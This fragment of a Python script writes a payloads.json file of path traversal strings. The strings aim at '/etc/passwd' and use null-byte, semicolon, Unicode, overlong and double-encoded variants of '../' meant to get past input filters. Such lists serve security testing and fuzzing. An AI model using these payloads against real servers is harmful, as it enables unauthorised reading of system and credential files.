...
with open("payloads.json","w") as payload_file:
	...
	#%2f = / || %2e = . || %252f = / || '%255c' = \
	list_of_postfix_1 = ['/etc','/etc/', '/etc/passwd', '%2fetc%2fpasswd','/etc/passwd%00index.html', '/etc/passwd;index.html','//etc//passwd']
	...
	'/..\\','.../','..././','..../','..%u2215','%uff0e%uff0e/','%uff0e%uff0e%u2215','..%u2216','..%uEFC8','..%uF025','..0x2f','0x2e0x2e/','0x2e0x2e0x2f','..%c0%2f'
